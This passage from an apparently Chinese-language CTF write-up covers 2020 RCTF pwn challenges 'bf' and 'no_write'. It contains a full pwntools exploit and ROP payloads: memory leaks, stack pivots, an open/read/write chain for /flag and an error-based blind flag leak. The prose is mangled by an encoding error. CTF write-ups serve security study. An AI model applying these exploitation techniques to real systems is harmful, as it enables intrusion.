title="readè¯»å…¥orwè·å¾—flag"></a>readè¯»å…¥orwè·å¾—flag</h3><p>å‰©ä¸‹çš„å°±æ˜¯æ„é€ orwçš„ropæ¥å®Œæˆæœ€åçš„åˆ©ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä¸Šä¸ªropçš„é•¿åº¦æ˜¯0x30ï¼Œè€Œæˆ‘ä»¬çš„stackæ˜¯è¿”å›åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ropèµ·ç‚¹æ˜¯stack+0x30ï¼Œè¯»å…¥æ˜¯ä»stackå¼€å§‹çš„ï¼Œæ‰€ä»¥å‰é¢ç©ºå‡ºçš„0x30æ•°æ®æ®µå¯ä»¥å¡«å…¥<code>/flag</code>ã€‚</p><p>éœ€è¦è®°å¾—åœ¨æœ€åé€€å‡ºä¸»å‡½æ•°ä¹‹å‰ï¼Œéœ€è¦æŠŠå­—ç¬¦ä¸²çš„æŒ‡é’ˆåœ°å€å¤åŸã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat([</span><br><span class="line">    p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ•´é“é¢˜æ¯”è¾ƒæœ‰è¶£çš„åœ°æ–¹æ˜¯é‚£ä¸ªå¦‚ä½•æ§åˆ¶å¥½å†™å…¥rop chainï¼Œä½¿ç”¨åˆ°brainfuckä»£ç æ¥å®ŒæˆæŒç»­çš„å†™å…¥ã€‚é€šè¿‡è¿™é“é¢˜ä¹Ÿäº†è§£åˆ°C++ä¸­stringçš„ç»“æ„ã€‚è¿™é‡Œç»™å‡ºå®˜æ–¹çš„expï¼Œå®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">6002</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p = remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">"./bf"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># leak low_bit</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">    info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line">    <span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug(0x000000000001C47)</span></span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">    info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">    info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># do rop</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x00000000000a17e0: pop rdi; ret;</span></span><br><span class="line">    <span class="comment"># 0x00000000001306d9: pop rdx; pop rsi; ret;</span></span><br><span class="line">    p_rdi = <span class="number">0x00000000000a17e0</span> + libc.address</span><br><span class="line">    p_rdx_rsi = <span class="number">0x00000000001306d9</span> + libc.address</span><br><span class="line">    ret = <span class="number">0x00000000000d3d8a</span> + libc.address</span><br><span class="line">    p_rax = <span class="number">0x00000000000439c8</span> + libc.address</span><br><span class="line">    syscall_ret = <span class="number">0x00000000000d2975</span> + libc.address  <span class="comment"># d2975!! get uid func</span></span><br><span class="line"></span><br><span class="line">    rop_chain = [</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">        p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">        p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">        p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">        p.send(<span class="string">'y'</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += flat([</span><br><span class="line">        p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">    ])</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># elf = ELF("./bf",checksec=False)</span></span><br><span class="line">    main(args[<span class="string">'REMOTE'</span>])</span><br></pre></td></tr></table></figure><h2 id="no-write"><a href="#no-write" class="headerlink" title="no_write"></a>no_write</h2><p>ä¸€é“èŠ±å¼ropçš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œåœ¨idaä¸­çœ‹åˆ°æœ‰prctlï¼Œç”¨å·¥å…·æŸ¥çœ‹å®ƒçš„seccompè®¾ç½®ã€‚</p><img src="/2020/08/01/2020rctf-some-pwn/3.png"><p>å‘ç°åªèƒ½ä½¿ç”¨<code>open</code>å’Œ<code>read</code>ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œåˆæ²¡æœ‰æ³„éœ²å‡½æ•°ã€‚éšåæŸ¥çœ‹å®ƒçš„ä¿æŠ¤æªæ–½ã€‚</p><img src="/2020/08/01/2020rctf-some-pwn/4.png"><p>å¼€å¯äº†<code>full relro</code>ä¸èƒ½ä½¿ç”¨<code>ret2dl_reslove</code>çš„æ”»å‡»æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰<code>open</code>å’Œ<code>read</code>ï¼Œæ˜¯å¯ä»¥æƒ³æ–¹æ³•<code>open ./flag</code>ï¼Œç„¶åè¯»å…¥æˆ‘ä»¬å¯æ§çš„æ•°æ®æ®µä¸­ã€‚å‰©ä¸‹çš„æ–¹æ³•å°±æ˜¯æ€ä¹ˆæŠŠ<code>flag</code>æ³„éœ²å‡ºæ¥ã€‚</p><p>åœ¨çœ‹åˆ°çš„wpä¸­æœ‰ä¸¤ç§æ€è·¯å¾ˆç±»ä¼¼SQLçš„ç›²æ³¨æ€æƒ³ï¼Œä¸€ç§æ˜¯åŸºäºé”™è¯¯çš„ç›²æ³¨ï¼Œåœ¨æ¯”è¾ƒä¸­æ„é€ ä¸€ç§æƒ…å†µï¼Œæ¯”è¾ƒæ­£ç¡®å’Œæ¯”è¾ƒé”™è¯¯å…¶ä¸­çš„ä¸€ç§èƒ½å¤Ÿå¼•å‘å¼‚å¸¸ï¼Œé€šè¿‡åˆ¤æ–­å¼‚å¸¸æ¥é€ä½çˆ†ç ´æ¯”è¾ƒï¼›å¦å¤–ä¸€ç§æ˜¯åŸºäºå»¶æ—¶çš„ç›²æ³¨ï¼Œè¿˜æ˜¯ç±»ä¼¼çš„æ„é€ å‡ºäºŒå…ƒæƒ…å†µï¼Œé€šè¿‡åˆ¤æ–­å“åº”æ—¶é—´æ¥é€ä½çˆ†ç ´æ¯”è¾ƒã€‚æˆ‘è¿™é‡Œä½¿ç”¨åŸºäºé”™è¯¯çš„ç›²æ³¨æ¥è§£å†³é¢˜ç›®ã€‚</p><h3 id="æ„é€ readè¯»å…¥rop-chain"><a href="#æ„é€ readè¯»å…¥rop-chain" class="headerlink" title="æ„é€ readè¯»å…¥rop chain"></a>æ„é€ readè¯»å…¥rop chain</h3><p>å› ä¸ºæ²¡æœ‰åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥é¦–å…ˆæƒ³åˆ°æˆ‘ä»¬å…ˆæ„é€ <code>read</code>è¯»å…¥æ•°æ®åˆ°æˆ‘ä»¬å¯æ§çš„åœ°å€ä¸Šï¼Œç„¶åè½¬ç§»æ ˆå¸§æ‰§è¡Œæˆ‘ä»¬æ”¾å…¥çš„rop chainã€‚è¿™é‡Œçš„rop chainä½¿ç”¨äº†<code>csu_init</code>ä¸­çš„ä¸‡èƒ½è°ƒç”¨gadgetï¼ŒæŠŠå†™å…¥æ•°æ®æ”¾åœ¨<code>0x601350</code>ï¼Œæ–¹ä¾¿åç»­åˆ©ç”¨ï¼Œé€šè¿‡gadgetä¹Ÿèƒ½åŒæ—¶æ§åˆ¶<code>rbp</code>ï¼Œåœ¨æœ«å°¾æ”¾ç½®<code>leave ret</code>å¼€å¯æ ˆè½¬ç§»æ“ä½œï¼Œæ§åˆ¶<code>rip</code>æŒ‡å‘æˆ‘ä»¬çš„rop chainã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-libc-start-main"><a href="#åˆ©ç”¨-libc-start-main" class="headerlink" title="åˆ©ç”¨__libc_start_main"></a>åˆ©ç”¨__libc_start_main</h3><p>æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡è¾“å…¥éœ€è¦ä½¿ç”¨<code>__libc_start_main</code>è°ƒç”¨<code>read_n</code>å‡½æ•°ï¼ŒæŠŠå‡½æ•°åœ°å€popè¿›<code>rdi</code>ä¸­ï¼Œå‰©ä¸‹çš„<code>rsi=0x601350</code>å’Œ<code>rdx=0x400</code>æ˜¯å¯ä»¥ç›´æ¥æ²¿ç”¨çš„å€¼ï¼Œè°ƒç”¨<code>__libc_start_main</code>å¯ä»¥è®©æ ˆä¸Šå‡ºç°libcç›¸å…³çš„åœ°å€ï¼Œè¿™æ ·å†åˆ©ç”¨gadgetä¿®æ”¹è¿™äº›åœ°å€å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚æˆ‘ä»¬è¦ä¸€ä½ä¸€ä½çš„çˆ†ç ´ï¼Œè‚¯å®šéœ€è¦ç”¨äºæ¯”è¾ƒçš„æŒ‡ä»¤ï¼Œéšåè¦ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è‚¯å®šéœ€è¦<code>syscall ret</code>ï¼Œåˆšå¥½åœ¨æ ˆä¸Šæ®‹å­˜äº†ä¸¤ä¸ªlibcåœ°å€å¯ä»¥ç”¨ã€‚è€Œæ€ä¹ˆä¿®æ”¹è¿™ä¸¤ä¸ªåœ°å€ï¼Ÿéœ€è¦ç”¨åˆ°ä¸€ä¸ªç‰¹æ®Šçš„gadgetã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E8                 add     [rbp-3Dh], ebx</span><br><span class="line">.text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span><br><span class="line">.text:00000000004005F0                 rep retn</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>rbp</code>å’Œ<code>ebx</code>æ˜¯å¯ä»¥é€šè¿‡ä¹‹å‰çš„<code>csu_init</code>çš„gadgetæ§åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä¿®æ”¹æ ˆä¸Šçš„åœ°å€å˜æˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„gadgetã€‚</p><p>æˆ‘è¿™é‡Œç”¨äºæ¯”è¾ƒçš„å‡½æ•°æ˜¯strncmpä¸­çš„<code>__strncmp_sse42</code>ï¼Œæˆ‘ä»¬è®¡ç®—offsetï¼Œè®©<code>ebx</code>ä¸ºè´Ÿæ•°å°±ä¼šå˜æˆå‡ã€‚åŒæ—¶è¿™é‡Œæ˜¯è¦ä¸æ–­è°ƒè¯•æ ˆå¸§çš„ï¼Œå‰é¢æœ‰ä¸€å®šé•¿åº¦çš„å¡«å……ï¼Œè¦è®©<code>__libc_start_main</code>çš„ç»“æŸè¿”å›åœ°å€æ”¾åœ¨<code>0x601350</code>ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬ç¬¬ä¸‰æ¬¡è¾“å…¥æ‰èƒ½ç›´æ¥è¦†ç›–è¿”å›åœ°å€è¿›è¡Œropã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure><h3 id="é€ä½çˆ†ç ´flag"><a href="#é€ä½çˆ†ç ´flag" class="headerlink" title="é€ä½çˆ†ç ´flag"></a>é€ä½çˆ†ç ´flag</h3><p>åœ¨<code>__libc_start_main</code>è°ƒç”¨å®Œä¹‹åï¼Œç”¨gadgetä¿®æ”¹æ ˆä¸Šçš„libcåœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦çš„gadgetï¼Œéšåå¼€å§‹ç”¨è¿™äº›gadgetæ‰§è¡Œopenå’Œread flagæ–‡ä»¶çš„æ“ä½œï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹ï¼Œç”±äºopenæ“ä½œæ²¡æœ‰å¯¹åº”çš„gotè¡¨ï¼Œæ‰€ä»¥éœ€è¦ç³»ç»Ÿè°ƒç”¨æ‰èƒ½ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè°ƒç”¨ä¸€æ¬¡readå‡½æ•°è¯»å…¥ä¸¤ä¸ªå­—èŠ‚ï¼Œè®©<code>rax=2</code>å†ç”¨<code>syscall ret</code>è°ƒç”¨openæ‰“å¼€flagæ–‡ä»¶ã€‚è¯»å…¥flagåˆ°æŸä¸ªåœ°å€ä¸­ï¼Œå†è¯»å…¥æˆ‘ä»¬çš„è¾“å…¥åˆ°<code>0x601fff</code>ï¼Œè¿™æ ·æ¯”è¾ƒçš„æ—¶å€™å¦‚æœå­—ç¬¦ç›¸åŒå°±ä¼šç»§ç»­æ¯”è¾ƒä¸‹ä¸€ä½ï¼Œè¿™æ ·å°±æº¢å‡ºäº†ç¨‹åºå¯ä»¥æ§åˆ¶çš„åœ°å€ï¼Œå¼•å‘é”™è¯¯ï¼Œé€šè¿‡è¿™ç§æŠ¥é”™çš„æ–¹æ³•ä¸€ä½ä¸€ä½çˆ†ç ´æ¯”è¾ƒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line"><span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åŒæ ·æ˜¯ä¸€é“éå¸¸æœ‰è¶£çš„é¢˜ç›®ï¼Œå­¦åˆ°pwnä¸­çš„ä¸€äº›ç›²æ³¨æ€è·¯ï¼Œå’ŒSQLæ³¨å…¥ç±»ä¼¼éƒ½æœ‰åŸºäºæŠ¥é”™çš„å’ŒåŸºäºå»¶æ—¶çš„æ–¹æ³•ã€‚ä»¥åŠåˆ©ç”¨<code>__libc_start_main</code>è®©libcåœ°å€å‡ºç°åœ¨æ 